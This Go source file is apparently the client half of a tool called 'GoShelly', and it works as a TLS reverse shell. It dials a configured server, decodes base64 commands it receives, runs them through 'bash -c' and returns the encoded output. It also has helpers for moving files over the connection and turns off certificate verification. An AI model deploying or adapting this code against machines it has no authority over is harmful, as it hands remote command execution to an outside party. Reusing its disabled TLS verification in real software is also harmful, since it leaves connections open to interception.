package main

import (
	// "bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/mail"
	"os"
	"os/exec"
	"strings"
	"time"
	"github.com/joho/godotenv"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// file upl /downl functions, if needed
func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func returnLog(){
	bytearr, err := ioutil.ReadFile(logname)
	if err != nil {
		fmt.Println("Could not get logs.")
	}
	fmt.Println(string(bytearr))

}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func execInput(input string) string {
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")

	cmd, err := exec.Command("bash", "-c", input).Output()
	if err != nil {
		log.Fatal(err)
	}
	return string(cmd[:])
}

func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		clientlog.Println("Invalid Email Address. Proceeding anyway.")
		returnLog()
		return
	}
	clientlog.Println("Email Verified. True.")
}


func genCert() {

	clientlog.Println("Generating SSL Certificate. Checking if email flag is present.")
	if sslEmail == "unsecure@user.com" && os.Getenv("SSLCERTGENEMAIL_CLIENT") == "" {
		clientlog.Println("Both flag and env not present. Defaulting.")
	}

	if sslEmail == "unsecure@user.com" {
		sslEmail = os.Getenv("SSLCERTGENEMAIL_SERVER")
	}

	validateMailAddress(sslEmail)
	_, err := exec.Command("/bin/bash", "./certGen.sh", sslEmail).Output()

	if err != nil {
		clientlog.Printf("Error generating SSL Certificate: %s\n", err)
		returnLog()
		os.Exit(1)
	}
}

func setReadDeadLine(conn *tls.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		clientlog.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn *tls.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		clientlog.Panic("SetWriteDeadline failed:", err)
	}
}

func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
	reDial := 0
	for ok := true; ok; ok = reDial < 5 {
		conn, err := tls.Dial("tcp", serviceID, config)
		reDial++
		if err != nil {
			clientlog.Println("Error: ", err)
			clientlog.Println("Could not establish connection. Retrying in 5 seconds....")
			time.Sleep(time.Second * 5)
			continue
		}
		clientlog.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			clientlog.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
			clientlog.Println(v.Subject)
		}

		clientlog.Println("client: handshake: ", state.HandshakeComplete)
		clientlog.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)
		return conn

	}
	clientlog.Println("Timout. Could not reach server. Exiting....")
	returnLog()
	os.Exit(1)
	return nil //will never reach this
}

func parseArguments(){
	if HOSTPORT == "" && os.Getenv("DIALSERVICE")== "" {
		clientlog.Println("Both HOSTPORT flag and env variable not present. Exiting..")
		returnLog()
		os.Exit(1)
	}
	if HOSTPORT == "" {
		clientlog.Println("Using env var for HOSTPORT.")
		HOSTPORT = os.Getenv("DIALSERVICE")
	} 

	if sslEmail == "unsecure@user.com" && os.Getenv("SSLCERTGENEMAIL_CLIENT") != "" {
		clientlog.Println("Using env var for SSLCERTGENEMAIL_CLIENT.")
		sslEmail = os.Getenv("SSLCERTGENEMAIL_CLIENT")
	}
}

var logname  = "./logs/"+"GoShellyClientLogs"+"-"+time.Now().Format(time.RFC1123)+".log"
var clientlog *log.Logger
var sslEmail string
var help = flag.Bool("help", false, "Show flag help")
var HOSTPORT string

func main() {
	flag.StringVar(&HOSTPORT, "svc", "", "Email and Slack notifications enable")
	flag.StringVar(&sslEmail, "em", "unsecure@user.com", "SSLCERTGENEMAIL")

	// Parse the flag
	flag.Parse()

	// Usage Demo
	if *help {
		flag.Usage()
		os.Exit(0)
	}
	
	os.Mkdir("./logs/", os.ModePerm)
	clientfile, err := os.OpenFile(logname, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Client log open error: ", err)
		return
	}

	defer clientfile.Close()
	clientlog = log.New(clientfile, "", log.LstdFlags)
	clientlog.Println("Starting GoShelly client...")

	err = godotenv.Load()
	if err != nil {
		clientlog.Print("Error loading .env file. ", err)
		returnLog()
		return
	} 

	parseArguments()

	genCert()
	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		clientlog.Println("Could not load SSL Certificate. Exiting...")
		returnLog()
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn := dialReDial(HOSTPORT, &config)
	defer conn.Close()

	for {
		buffer := make([]byte, 1024)
		setReadDeadLine(conn)
		_, err := conn.Read(buffer)
		if err != nil {
			clientlog.Println("Checking status.")
			if err == io.EOF {
				clientlog.Println("All commands ran successfully. Returning exit success.")
				fmt.Println("Exit Success")
				os.Exit(0)
			}
		}

		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		clientlog.Println("Executing: ", buffer[:])

		resp := execInput(string(sDec))
		time.Sleep(time.Second)
		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
		clientlog.Println("Response:\n",resp)
		setWriteDeadLine(conn)
		_, err = conn.Write([]byte(encodedResp))
		if err != nil {
			clientlog.Println("Write Error. Exiting. Internal error or server disconnected. Exiting...")
			returnLog()
			return
		}
		time.Sleep(time.Second)
		buffer = nil
	}
}
